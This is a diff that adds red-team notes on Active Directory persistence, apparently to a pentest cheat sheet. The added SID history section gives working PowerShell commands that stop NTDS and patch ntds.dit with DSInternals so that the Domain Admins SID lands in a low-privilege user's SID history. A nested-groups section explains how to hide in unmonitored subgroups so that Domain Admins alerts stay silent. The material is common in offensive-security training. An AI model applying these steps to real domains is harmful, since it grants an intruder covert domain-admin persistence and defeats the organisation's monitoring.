@@ -76,3 +76,40 @@ for example:
   # Done! we have the session.
   ```
   
+  # #Persistence with SID History:
+  ## Notes:
+      - Since the SIDs are added to the user's token, privileges would be respected even if the account is not a member of the actual group
+      - but our account can simply be a normal user account with membership only to the Domain Users group.
+  ### operations:
+      -  let's make sure that our low-privilege user does not currently have any information in their SID history
+      ```ps1
+        Get-ADUser <your ad username> -properties sidhistory,memberof
+      ```
+      - Let's get the SID of the Domain Admins group since this is the group we want to add to our SID History:
+      ```ps1
+        Get-ADGroup "Domain Admins"
+      ```      
+      - we will use the ![DSInternals](https://github.com/MichaelGrafnetter/DSInternals) tools to directly patch the ntds.dit file
+      ```ps1
+        Stop-Service -Name ntds -force
+        Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit
+        Start-Service -Name ntds
+      ```
+      
+  # #Persistence with Group Memebership (Nested Groups):
+  ## Notes:
+    - Groups that provide local administrator rights are often not monitored as closely as protected groups. With local administrator rights to the correct hosts through group membership of a network support group, we may have good persistence that can be used to compromise the domain again.
+    - It is not always about direct privileges. Sometimes groups with indirect privileges, such as ownership over Group Policy Objects (GPOs), can be just as good for persistence
+    - This also becomes a monitoring problem. Let's say, for instance, we have an alert that fires off when a new member is added to the Domain Admins group. That is a good alert to have, but it won't fire off if a user is added to a subgroup within the Domain Admins group
+    - Rather than adding ourselves to a privileged group that would raise an alert, we add ourselves to a subgroup that is not being monitored.
+  
+    
+      
+      
+      
+      
+      
+      
+      
+  
+  
